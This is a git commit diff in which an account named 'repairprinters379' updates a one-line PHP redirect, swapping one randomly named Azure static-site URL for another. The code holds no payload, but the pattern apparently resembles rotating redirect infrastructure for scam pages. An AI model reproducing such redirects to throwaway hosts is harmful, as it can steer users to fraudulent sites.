3a7c5e9bd66e3d5574a57c8b7bb7ee3573d98c86
repairprinters379 <repairprinters379@gmail.com>
2025-01-14 21:45:09 +0530

    Update index.php

--- index.php
+++ index.php
@@ -1,7 +1,7 @@
 <?php
  
 // Redirect browser
-header("Location: https://meratebasfix.z19.web.core.windows.net/");
+header("Location: https://droppingby91code779xx.z19.web.core.windows.net/");
  
 exit;
 ?>
